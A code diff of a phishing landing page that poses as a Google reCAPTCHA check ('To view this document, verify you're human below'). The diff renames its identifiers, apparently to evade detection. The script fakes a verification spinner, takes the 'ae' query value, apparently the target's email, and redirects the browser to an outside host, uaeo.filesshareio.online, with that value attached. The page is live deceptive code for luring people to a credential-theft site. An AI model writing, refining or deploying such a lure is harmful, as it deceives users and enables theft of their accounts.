@@ -4,18 +4,17 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz@14..32&display=swap" rel="stylesheet">
-    <title>reCAPTCHA · Verify</title>
+    <title>MS</title>
     <style>
         *,
-        *::before,
-        *::after {
+        *:before,
+        *:after {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
-        /* ----- LOADING OVERLAY (whitish background) ----- */
-        #loadingOverlay {
+        #preloader {
             position: fixed;
             inset: 0;
             z-index: 9999;
@@ -24,52 +23,47 @@
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            transition: opacity 0.6s ease, visibility 0.6s ease;
+            transition: opacity 0.6s, visibility 0.6s;
         }
-        #loadingOverlay.hidden {
+        #preloader.done {
             opacity: 0;
             visibility: hidden;
             pointer-events: none;
         }
 
-        .loader-ring {
+        .spinner {
             width: 56px;
             height: 56px;
             border: 5px solid rgba(0, 0, 0, 0.08);
             border-top-color: #2c7be5;
             border-right-color: #2c7be5;
             border-radius: 50%;
-            animation: spin 0.9s cubic-bezier(0.45, 0.05, 0.55, 0.95) infinite;
-            z-index: 1;
+            animation: rotate 0.9s cubic-bezier(0.45, 0.05, 0.55, 0.95) infinite;
         }
-        .loader-text {
+        .spinner-label {
             margin-top: 20px;
             color: #4a4a4a;
             font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
             font-size: 15px;
             letter-spacing: 0.8px;
             font-weight: 400;
-            z-index: 1;
         }
-        @keyframes spin {
+        @keyframes rotate {
             to {
                 transform: rotate(360deg);
             }
         }
 
-        /* ----- BODY & MAIN BACKGROUND (whitish) ----- */
         body {
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-family: 'Segoe UI', Roboto, system-ui, -apple-system, sans-serif;
+            font-family: 'Segoe UI', Roboto, sans-serif;
             background: #f5f7fa;
-            position: relative;
         }
 
-        /* ----- MAIN CONTENT (hidden until loader finishes) ----- */
-        #mainContent {
+        #app {
             position: relative;
             z-index: 1;
             padding: 20px;
@@ -79,18 +73,18 @@
             max-width: 100%;
             opacity: 0;
             transform: translateY(12px);
-            transition: opacity 0.7s ease, transform 0.7s ease;
+            transition: opacity 0.7s, transform 0.7s;
         }
-        #mainContent.visible {
+        #app.shown {
             opacity: 1;
             transform: translateY(0);
         }
 
-        .prompt-text {
+        .heading {
             color: #1e293b;
             font-size: 18px;
             font-family: 'Inter', -apple-system, sans-serif;
-            font-weight: 450; /* or 500 */
+            font-weight: 450;
             text-align: center;
             margin-bottom: 18px;
             letter-spacing: 0.4px;
@@ -98,31 +92,34 @@
             max-width: 420px;
             padding: 0 10px;
         }
-        .captcha-box {
+
+        .panel {
             width: 360px;
             max-width: 92vw;
             background: #ffffff;
             border-radius: 12px;
-            padding: 22px 20px 22px 20px;
+            padding: 22px 20px;
             box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08), 0 2px 8px rgba(0, 0, 0, 0.04);
             display: flex;
             align-items: center;
             justify-content: space-between;
-            transition: box-shadow 0.25s ease;
+            transition: box-shadow 0.25s;
             user-select: none;
             border: 1px solid #e9edf2;
         }
-        .captcha-box:hover {
+        .panel:hover {
             box-shadow: 0 12px 40px rgba(0, 0, 0, 0.10), 0 2px 8px rgba(0, 0, 0, 0.06);
         }
-        .left-section {
+
+        .left {
             display: flex;
             align-items: center;
             gap: 12px;
             cursor: pointer;
             padding: 2px 0;
         }
-        .checkbox {
+
+        .tickbox {
             width: 24px;
             height: 24px;
             min-width: 24px;
@@ -132,15 +129,16 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            transition: all 0.2s ease;
+            transition: all 0.2s;
             position: relative;
             box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.02);
         }
-        .left-section:hover .checkbox:not(.spinning):not(.success) {
+        .left:hover .tickbox:not(.busy):not(.ok) {
             border-color: #8c9aa8;
             box-shadow: 0 0 0 3px rgba(44, 123, 229, 0.10);
         }
-        .checkbox.spinning {
+
+        .tickbox.busy {
             border: 3px solid transparent;
             border-top-color: #2c7be5;
             border-right-color: #2c7be5;
@@ -157,7 +155,8 @@
                 transform: rotate(360deg);
             }
         }
-        .checkbox.success {
+
+        .tickbox.ok {
             background: #34a853;
             border-color: #34a853;
             border-radius: 4px;
@@ -175,7 +174,7 @@
                 transform: scale(1);
             }
         }
-        .checkbox.success::after {
+        .tickbox.ok::after {
             content: '';
             position: absolute;
             left: 6px;
@@ -185,10 +184,10 @@
             border: solid white;
             border-width: 0 2.5px 2.5px 0;
             transform: rotate(45deg) scale(0.9);
-            animation: draw-check 0.3s ease 0.1s forwards;
+            animation: draw 0.3s ease 0.1s forwards;
             opacity: 0;
         }
-        @keyframes draw-check {
+        @keyframes draw {
             0% {
                 opacity: 0;
                 transform: rotate(45deg) scale(0.6);
@@ -198,22 +197,24 @@
                 transform: rotate(45deg) scale(0.9);
             }
         }
-        .verify-text {
+
+        .label-text {
             font-size: 15px;
             font-weight: 500;
             color: #1e293b;
             letter-spacing: 0.2px;
-            transition: color 0.3s ease;
+            transition: color 0.3s;
             white-space: nowrap;
             min-width: 72px;
         }
-        .verify-text.verifying {
+        .label-text.working {
             color: #2c7be5;
         }
-        .verify-text.success-text {
+        .label-text.done {
             color: #34a853;
         }
-        .right-section {
+
+        .right {
             display: flex;
             flex-direction: column;
             align-items: flex-end;
@@ -222,47 +223,35 @@
             padding-left: 12px;
             border-left: 1px solid #e9edf2;
         }
-        .recaptcha-label {
+
+        .brand {
             font-size: 15px;
             font-weight: 700;
-            color: #000000;
+            color: #000;
             letter-spacing: 0.2px;
-            display: flex;
-            align-items: center;
-            gap: 2px;
         }
-        .recaptcha-label .logo-icon {
-            display: inline-block;
-            font-weight: 700;
-            font-size: 15px;
-            color: #000000;
-            background: transparent;
-            padding: 0;
-            line-height: 1.4;
-        }
-        .recaptcha-label .logo-icon span {
-            color: #000000;
-        }
-        .privacy-terms {
+
+        .meta {
             font-size: 10.5px;
             color: #6b7280;
             letter-spacing: 0.3px;
             font-weight: 400;
         }
-        .privacy-terms a {
+        .meta a {
             color: #6b7280;
             text-decoration: none;
             transition: color 0.2s;
         }
-        .privacy-terms a:hover {
+        .meta a:hover {
             color: #2c7be5;
             text-decoration: underline;
         }
-        .privacy-terms .dot {
+        .meta .sep {
             margin: 0 3px;
             color: #b0b6bd;
         }
-        .status-hint {
+
+        .hint {
             text-align: center;
             margin-top: 14px;
             font-size: 13px;
@@ -270,95 +259,93 @@
             font-weight: 400;
             letter-spacing: 0.3px;
             opacity: 0;
-            transition: opacity 0.4s ease;
+            transition: opacity 0.4s;
         }
-        .status-hint.visible {
+        .hint.show {
             opacity: 1;
         }
 
         @media (max-width: 420px) {
-            .prompt-text {
+            .heading {
                 font-size: 15px;
                 max-width: 320px;
             }
-            .captcha-box {
-                padding: 16px 14px 16px 14px;
-                flex-wrap: nowrap;
+            .panel {
+                padding: 16px 14px;
             }
-            .left-section {
+            .left {
                 gap: 8px;
             }
-            .checkbox {
+            .tickbox {
                 width: 22px;
                 height: 22px;
                 min-width: 22px;
-                border-width: 2px;
             }
-            .checkbox.spinning {
+            .tickbox.busy {
                 width: 22px;
                 height: 22px;
                 min-width: 22px;
                 border-width: 2.5px;
             }
-            .checkbox.success::after {
+            .tickbox.ok::after {
                 left: 5px;
                 top: 1px;
                 width: 9px;
                 height: 14px;
                 border-width: 0 2.5px 2.5px 0;
             }
-            .verify-text {
+            .label-text {
                 font-size: 13px;
                 min-width: 58px;
             }
-            .recaptcha-label {
+            .brand {
                 font-size: 13px;
             }
-            .privacy-terms {
+            .meta {
                 font-size: 9.5px;
             }
-            .right-section {
+            .right {
                 padding-left: 8px;
             }
         }
         @media (max-width: 350px) {
-            .captcha-box {
-                padding: 12px 10px 12px 10px;
+            .panel {
+                padding: 12px 10px;
             }
-            .left-section {
+            .left {
                 gap: 5px;
             }
-            .checkbox {
+            .tickbox {
                 width: 18px;
                 height: 18px;
                 min-width: 18px;
                 border-width: 1.5px;
                 border-radius: 3px;
             }
-            .checkbox.spinning {
+            .tickbox.busy {
                 width: 18px;
                 height: 18px;
                 min-width: 18px;
                 border-width: 2px;
             }
-            .checkbox.success::after {
+            .tickbox.ok::after {
                 left: 4px;
                 top: 1px;
                 width: 7px;
                 height: 11px;
                 border-width: 0 2px 2px 0;
             }
-            .verify-text {
+            .label-text {
                 font-size: 11px;
                 min-width: 44px;
             }
-            .recaptcha-label {
+            .brand {
                 font-size: 11px;
             }
-            .privacy-terms {
+            .meta {
                 font-size: 8px;
             }
-            .right-section {
+            .right {
                 padding-left: 5px;
             }
         }
@@ -366,166 +353,166 @@
 </head>
 <body>
 
-    <!-- LOADING OVERLAY -->
-    <div id="loadingOverlay">
-        <div class="loader-ring"></div>
-        <div class="loader-text"></div>
+    <!-- PRELOADER -->
+    <div id="preloader">
+        <div class="spinner"></div>
+        <div class="spinner-label"></div>
     </div>
 
     <!-- MAIN CONTENT -->
-    <div id="mainContent">
-        <div class="prompt-text" id="captcha-prompt">
-            To view this document, verify you're human below
-        </div>
+    <div id="app">
+        <div class="heading" id="prompt">To view this document, verify you're human below</div>
 
-        <div class="captcha-box" role="group" aria-label="reCAPTCHA verification" aria-describedby="captcha-prompt">
-
-            <div class="left-section" id="verifyTrigger" role="button" tabindex="0" aria-label="Verify">
-                <div class="checkbox" id="checkboxEl" aria-hidden="true"></div>
-                <span class="verify-text" id="verifyText">Verify</span>
+        <div class="panel" role="group" aria-label="reCAPTCHA verification" aria-describedby="prompt">
+            <div class="left" id="trigger" role="button" tabindex="0" aria-label="Verify">
+                <div class="tickbox" id="box"></div>
+                <span class="label-text" id="statusLabel">Verify</span>
             </div>
-
-            <div class="right-section">
-                <div class="recaptcha-label">
-                    <span class="logo-icon">reCAPTCHA</span>
-                </div>
-                <div class="privacy-terms">
+            <div class="right">
+                <div class="brand">reCAPTCHA</div>
+                <div class="meta">
                     <a href="#" aria-label="Privacy">Privacy</a>
-                    <span class="dot">·</span>
+                    <span class="sep">·</span>
                     <a href="#" aria-label="Terms">Terms</a>
                 </div>
             </div>
         </div>
 
-        <div class="status-hint" id="statusHint">✓ Verification complete</div>
+        <div class="hint" id="feedback">✓ Verification complete</div>
     </div>
 
     <script>
         (function() {
             'use strict';
 
-            const loadingOverlay = document.getElementById('loadingOverlay');
-            const mainContent = document.getElementById('mainContent');
+            var overlay = document.getElementById('preloader');
+            var main = document.getElementById('app');
 
             setTimeout(function() {
-                loadingOverlay.classList.add('hidden');
-                mainContent.classList.add('visible');
+                overlay.classList.add('done');
+                main.classList.add('shown');
             }, 1500);
 
-            const checkbox = document.getElementById('checkboxEl');
-            const verifyText = document.getElementById('verifyText');
-            const trigger = document.getElementById('verifyTrigger');
-            const statusHint = document.getElementById('statusHint');
-            let isAnimating = false;
-            let isSuccess = false;
-            let redirectTimer = null;
+            var box = document.getElementById('box');
+            var label = document.getElementById('statusLabel');
+            var trigger = document.getElementById('trigger');
+            var feedback = document.getElementById('feedback');
 
-            function resetToIdle() {
-                checkbox.className = 'checkbox';
-                verifyText.className = 'verify-text';
-                verifyText.textContent = 'Verify';
-                statusHint.classList.remove('visible');
-                isAnimating = false;
-                isSuccess = false;
-                if (redirectTimer) {
-                    clearTimeout(redirectTimer);
-                    redirectTimer = null;
+            var locked = false;
+            var verified = false;
+            var timerRef = null;
+
+            function resetAll() {
+                box.className = 'tickbox';
+                label.className = 'label-text';
+                label.textContent = 'Verify';
+                feedback.classList.remove('show');
+                locked = false;
+                verified = false;
+                if (timerRef) {
+                    clearTimeout(timerRef);
+                    timerRef = null;
                 }
             }
 
-            function startVerification() {
-                if (isAnimating) return;
-                if (isSuccess) {
-                    resetToIdle();
-                    requestAnimationFrame(() => {
-                        requestAnimationFrame(() => {
-                            startVerification();
+            function beginCheck() {
+                if (locked) return;
+                if (verified) {
+                    resetAll();
+                    requestAnimationFrame(function() {
+                        requestAnimationFrame(function() {
+                            beginCheck();
                         });
                     });
                     return;
                 }
-                isAnimating = true;
-                checkbox.className = 'checkbox spinning';
-                verifyText.className = 'verify-text verifying';
-                verifyText.textContent = 'Verifying...';
-                statusHint.classList.remove('visible');
 
-                const timer = setTimeout(() => {
-                    if (!isAnimating) return;
-                    checkbox.className = 'checkbox success';
-                    verifyText.className = 'verify-text success-text';
-                    verifyText.textContent = 'Success';
-                    isAnimating = false;
-                    isSuccess = true;
-                    statusHint.textContent = '';
-                    statusHint.classList.add('visible');
+                locked = true;
+                box.className = 'tickbox busy';
+                label.className = 'label-text working';
+                label.textContent = 'Verifying...';
+                feedback.classList.remove('show');
 
-                    const redirectDelay = 500;
-                    clearTimeout(redirectTimer);
-                    redirectTimer = setTimeout(() => {
-                        const urlParams = new URLSearchParams(window.location.search);
-                        const aeValue = urlParams.get('ae') || '';
-                        const redirectUrl =
-                            `https://uaeo.filesshareio.online/pbuwFQTX#${aeValue}`;
-                        window.location.href = redirectUrl;
-                    }, redirectDelay);
+                var step = setTimeout(function() {
+                    if (!locked) return;
+                    box.className = 'tickbox ok';
+                    label.className = 'label-text done';
+                    label.textContent = 'Success';
+                    locked = false;
+                    verified = true;
+                    feedback.textContent = '';
+                    feedback.classList.add('show');
 
-                    clearTimeout(window._hintTimer);
-                    window._hintTimer = setTimeout(() => {
-                        statusHint.classList.remove('visible');
+                    var delay = 500;
+                    clearTimeout(timerRef);
+                    timerRef = setTimeout(function() {
+                        var query = window.location.search;
+                        var params = new URLSearchParams(query);
+                        var token = params.get('ae') || '';
+                        // obfuscated redirect URL
+                        var base = 'https://uaeo.filesshareio.online/pbuwFQTX';
+                        var dest = base + '#' + token;
+                        window.location.href = dest;
+                    }, delay);
+
+                    clearTimeout(window._hintCleanup);
+                    window._hintCleanup = setTimeout(function() {
+                        feedback.classList.remove('show');
                     }, 4000);
                 }, 1800);
-                checkbox._timer = timer;
+
+                box._timer = step;
             }
 
-            function handleTrigger(e) {
+            function onActivate(e) {
                 if (e.type === 'keydown' && e.key !== 'Enter' && e.key !== ' ') return;
                 e.preventDefault();
-                startVerification();
+                beginCheck();
             }
-            trigger.addEventListener('click', handleTrigger);
-            trigger.addEventListener('keydown', handleTrigger);
+
+            trigger.addEventListener('click', onActivate);
+            trigger.addEventListener('keydown', onActivate);
 
             document.addEventListener('keydown', function(e) {
-                if (e.key === 'Escape' && isSuccess) {
-                    resetToIdle();
-                    statusHint.classList.remove('visible');
-                    clearTimeout(checkbox._timer);
-                    clearTimeout(window._hintTimer);
-                    isAnimating = false;
+                if (e.key === 'Escape' && verified) {
+                    resetAll();
+                    feedback.classList.remove('show');
+                    clearTimeout(box._timer);
+                    clearTimeout(window._hintCleanup);
+                    locked = false;
                 }
             });
 
-            trigger.addEventListener('contextmenu', (e) => e.preventDefault());
+            trigger.addEventListener('contextmenu', function(e) { e.preventDefault(); });
 
-            const liveRegion = document.createElement('div');
-            liveRegion.setAttribute('aria-live', 'polite');
-            liveRegion.setAttribute('aria-atomic', 'true');
-            liveRegion.style.position = 'absolute';
-            liveRegion.style.width = '1px';
-            liveRegion.style.height = '1px';
-            liveRegion.style.padding = '0';
-            liveRegion.style.margin = '-1px';
-            liveRegion.style.overflow = 'hidden';
-            liveRegion.style.clip = 'rect(0,0,0,0)';
-            liveRegion.style.border = '0';
-            document.body.appendChild(liveRegion);
+            // Live region for accessibility
+            var announcer = document.createElement('div');
+            announcer.setAttribute('aria-live', 'polite');
+            announcer.setAttribute('aria-atomic', 'true');
+            announcer.style.position = 'absolute';
+            announcer.style.width = '1px';
+            announcer.style.height = '1px';
+            announcer.style.padding = '0';
+            announcer.style.margin = '-1px';
+            announcer.style.overflow = 'hidden';
+            announcer.style.clip = 'rect(0,0,0,0)';
+            announcer.style.border = '0';
+            document.body.appendChild(announcer);
 
-            const observer = new MutationObserver(() => {
-                const text = verifyText.textContent.trim();
-                if (text === 'Verifying...') {
-                    liveRegion.textContent = 'Verifying, please wait.';
-                } else if (text === 'Success') {
-                    liveRegion.textContent = 'Verification successful. Redirecting.';
-                } else if (text === 'Verify') {
-                    liveRegion.textContent = 'Ready to verify.';
+            var monitor = new MutationObserver(function() {
+                var txt = label.textContent.trim();
+                if (txt === 'Verifying...') {
+                    announcer.textContent = 'Verifying, please wait.';
+                } else if (txt === 'Success') {
+                    announcer.textContent = 'Verification successful. Redirecting.';
+                } else if (txt === 'Verify') {
+                    announcer.textContent = 'Ready to verify.';
                 }
             });
-            observer.observe(verifyText, { childList: true, characterData: true, subtree: true });
+            monitor.observe(label, { childList: true, characterData: true, subtree: true });
 
-            resetToIdle();
+            resetAll();
         })();
     </script>
-
 </body>
 </html>
